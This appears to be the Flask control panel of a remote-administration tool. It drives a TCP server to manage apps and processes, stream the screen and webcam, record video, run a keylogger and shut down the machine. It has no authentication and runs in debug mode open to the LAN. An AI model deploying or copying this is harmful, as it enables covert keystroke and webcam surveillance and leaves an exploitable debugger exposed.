from flask import Flask, render_template, request, jsonify, Response
import socket
import json
import os
import struct
from datetime import datetime

TCP_SERVER_IP = "127.0.0.1"
TCP_PORT = 5001

app = Flask(__name__)

# --- HÀM GIAO TIẾP TCP CƠ BẢN ---
def send_tcp_command(cmd):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((TCP_SERVER_IP, TCP_PORT))
            s.sendall(cmd.encode())
            # Buffer lớn để nhận danh sách process dài
            result = s.recv(16384).decode() 
        return result
    except Exception as e:
        return f"[ERROR] {e}"

# --- HÀM LẤY DANH SÁCH APP ---
def get_remote_apps():
    try:
        response = send_tcp_command("list_apps")
        if response.startswith("[ERROR]"):
            return {}
        return json.loads(response)
    except:
        return {}

# --- HÀM NHẬN ẢNH STREAM TỪ SERVER ---
def get_image_from_server(command):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((TCP_SERVER_IP, TCP_PORT))
            s.sendall(command.encode())
            
            # 1. Nhận 4 bytes kích thước
            size_data = s.recv(4)
            if not size_data: return None
            size = struct.unpack(">L", size_data)[0]
            if size == 0: return None
            
            # 2. Nhận dữ liệu ảnh
            data = b""
            while len(data) < size:
                packet = s.recv(size - len(data))
                if not packet: break
                data += packet
            return data
    except:
        return None

def save_screenshot_locally():
    try:
        # Gửi lệnh download_screenshot lên server
        img_data = get_image_from_server("download_screenshot")
        
        if not img_data:
            return "[ERROR] Failed to download image from server"
        
        # Tạo thư mục lưu trên Client
        save_dir = "screenshots"
        os.makedirs(save_dir, exist_ok=True)
        
        # Tạo tên file theo thời gian
        filename = f"{save_dir}/shot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
        
        # Ghi dữ liệu ra file
        with open(filename, "wb") as f:
            f.write(img_data)
            
        # Trả về đường dẫn tuyệt đối để dễ tìm
        return f"[OK] Saved to Client: {os.path.abspath(filename)}"
    except Exception as e:
        return f"[ERROR] {e}"

def save_video_locally(seconds):
    try:
        # Gửi lệnh quay video kèm số giây
        # Server sẽ quay -> gửi dữ liệu file về
        video_data = get_image_from_server(f"webcam_record {seconds}")
        
        if not video_data:
            return "[ERROR] Failed to download video from server"
        
        # Tạo thư mục lưu trên Client
        save_dir = "recordings"
        os.makedirs(save_dir, exist_ok=True)
        
        filename = f"{save_dir}/video_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
        
        with open(filename, "wb") as f:
            f.write(video_data)
            
        return f"[OK] Saved to Client: {os.path.abspath(filename)}"
    except Exception as e:
        return f"[ERROR] {e}"

def generate_stream(command):
    while True:
        frame_data = get_image_from_server(command)
        if frame_data:
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + frame_data + b'\r\n')

# ================= ROUTES =================

@app.route("/")
def home():
    return render_template("index.html", title="Home", mode=None)

# --- CÁC TRANG CHỨC NĂNG ---
@app.route("/start")
def start_page():
    return render_template("index.html", title="Start Application", mode="start", app_list=get_remote_apps())

@app.route("/stop")
def stop_page():
    return render_template("index.html", title="Stop Application", mode="stop", app_list=get_remote_apps())

@app.route("/apps")
def manage_apps_page():
    return render_template("index.html", title="Application Manager", mode="apps", app_list=get_remote_apps())

@app.route("/screenshot")
def screenshot_page():
    return render_template("index.html", title="Live Screen View", mode="screenshot")

@app.route("/webcam")
def webcam_page():
    return render_template("index.html", title="Live Webcam View", mode="webcam")

@app.route("/shutdown")
def shutdown_page():
    return render_template("index.html", title="Shutdown System", mode="shutdown")

@app.route("/restart")
def restart_page():
    return render_template("index.html", title="Restart System", mode="restart")

@app.route("/processes")
def processes_page():
    process_data = send_tcp_command("list_processes")
    return render_template("index.html", title="Task Manager", mode="processes", process_list=process_data)

@app.route("/keylogger")
def keylogger_page():
    # Khi vào trang này, gửi lệnh yêu cầu Server xóa file log cũ
    send_tcp_command("keylog_clear")
    
    # Xóa luôn file log tạm trên client (nếu có)
    try: os.remove("web_keylog.txt")
    except: pass
    
    return render_template("index.html", title="Keylogger", mode="keylogger", keys="")
# --- ROUTES API & STREAM ---

@app.route('/video_feed_screen')
def video_feed_screen():
    return Response(generate_stream("screen_stream"), mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/video_feed_webcam')
def video_feed_webcam():
    return Response(generate_stream("webcam_stream"), mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route("/api/apps_status")
def api_apps_status():
    return jsonify(get_remote_apps())

@app.route("/keylogger_data")
def keylogger_data():
    # SỬA LỖI: Thay vì đọc file local, hãy hỏi Server nội dung file
    # Server đã có lệnh "keylog_data" để trả về nội dung này
    keys = send_tcp_command("keylog_data")
    
    # Kiểm tra nếu kết nối lỗi
    if keys.startswith("[ERROR]"):
        keys = ""
        
    return jsonify({"keys": keys})

@app.route("/logkey_web", methods=["POST"])
def logkey_web():
    key = request.json.get("key")
    if key: send_tcp_command(f"keylog_web {key}")
    return jsonify({"status": "ok"})

# --- ROUTE ĐIỀU KHIỂN CHÍNH (QUAN TRỌNG) ---
@app.route("/control", methods=["POST"])
def control_action():
    # 1. Lấy dữ liệu (JSON hoặc Form)
    if request.is_json:
        data = request.get_json()
        action = data.get("action")
        app_name = data.get("app")
        seconds = data.get("seconds")
    else:
        action = request.form.get("action")
        app_name = request.form.get("app")
        seconds = request.form.get("seconds")

    command = ""
    
    # 2. Xử lý logic lệnh
    if action == "keylog_start":
        command = "keylog_start"
    elif action == "keylog_stop":
        command = "keylog_stop"
    elif action == "keylog_clear":
        command = "keylog_clear"
    elif action in ("start", "stop"):
        if not app_name:
            msg = "[ERROR] Missing app name"
            if request.is_json: return jsonify({"status": "error", "message": msg})
            return render_template("index.html", title="Error", message=msg, mode=action, app_list=get_remote_apps())
        command = f"{action} {app_name}"

    elif action == "screenshot":
        # Gọi hàm lưu file cục bộ thay vì gửi lệnh "screenshot" cũ
        result = save_screenshot_locally()
        
        if request.is_json:
            return jsonify({"status": "ok", "message": result})
        # Fallback cho form thường
        return render_template("index.html", title="Result", message=result, mode=action)
    
    elif action == "webcam_record":
        if not seconds or not str(seconds).isdigit():
            msg = "[ERROR] Invalid seconds"
            if request.is_json: return jsonify({"status": "error", "message": msg})
            return render_template("index.html", title="Error", message=msg)
        
        # GỌI HÀM LƯU LOCAL MỚI
        result = save_video_locally(seconds)
        
        if request.is_json:
            return jsonify({"status": "ok", "message": result})
        return render_template("index.html", title="Result", message=result)

    elif action == "shutdown": command = "shutdown"
    elif action == "restart": command = "restart"
    else:
        msg = f"[ERROR] Unknown action {action}"
        if request.is_json: return jsonify({"status": "error", "message": msg})
        return render_template("index.html", title="Error", message=msg)

    # 3. Gửi lệnh
    result = send_tcp_command(command)

    # 4. Trả về kết quả
    if request.is_json:
        return jsonify({"status": "ok", "message": result})

    # Nếu là Form submit (như nút Webcam Record), load lại trang
    app_list = {}
    if action in ("start", "stop"):
        app_list = get_remote_apps()
        
    return render_template("index.html", title="Result", message=result, mode=action, app_list=app_list)

if __name__ == "__main__":
    # Host 0.0.0.0 để các máy khác trong LAN cũng vào được
    app.run(host="0.0.0.0", port=8000, debug=True)